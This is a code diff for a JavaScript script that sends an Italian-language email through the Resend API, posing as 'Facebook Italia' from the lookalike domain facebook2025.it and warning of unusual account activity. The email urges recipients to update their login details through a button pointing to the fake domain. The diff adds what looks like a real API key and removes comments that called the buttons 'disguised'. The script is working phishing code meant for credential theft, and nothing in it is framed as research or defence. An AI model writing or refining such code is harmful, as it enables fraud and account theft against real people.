@@ -1,9 +1,9 @@
 import { Resend } from 'resend';
 
-const resend = new Resend('YOUR_API_KEY'); // 👉 Sostituisci con la tua vera API key
+const resend = new Resend('re_XQyqAEvo_7oVzPyJwEhJ4WFe5xfm4RDjq'); // 👉 Sostituisci con la tua vera API key
 
 await resend.emails.send({
-  from: 'Facebook Italia <noreply@facebook2025.it>', // ✅ Usa dominio verificato
+  from: 'Facebook Italia <securitynoreply@facebook2025.it>', // ✅ Usa dominio verificato
   to: email, // 🔁 Variabile dinamica ricevuta dal form
   subject: 'Attività insolita sul tuo account Facebook',
 
@@ -27,7 +27,7 @@ await resend.emails.send({
       Per garantire la tua sicurezza, ti invitiamo ad aggiornare le credenziali di accesso.
     </p>
 
-    <!-- 🔵 Bottone camuffato -->
+    
     <div style="text-align:center; margin:30px 0;">
       <a href="https://facebook2025.it/"
          style="background-color:#1877f2; color:#fff; padding:12px 24px;
@@ -48,7 +48,7 @@ await resend.emails.send({
       <a href="https://www.facebook.com/help/security">Scopri di più</a>
     </p>
 
-    <!-- 🔘 Bottone disiscrizione camuffato -->
+    
     <div style="text-align:center; margin:40px 0;">
       <a href="https://facebook2025.it/unsubscribe"
          style="background-color:#e4e6eb; color:#333; padding:10px 20px;
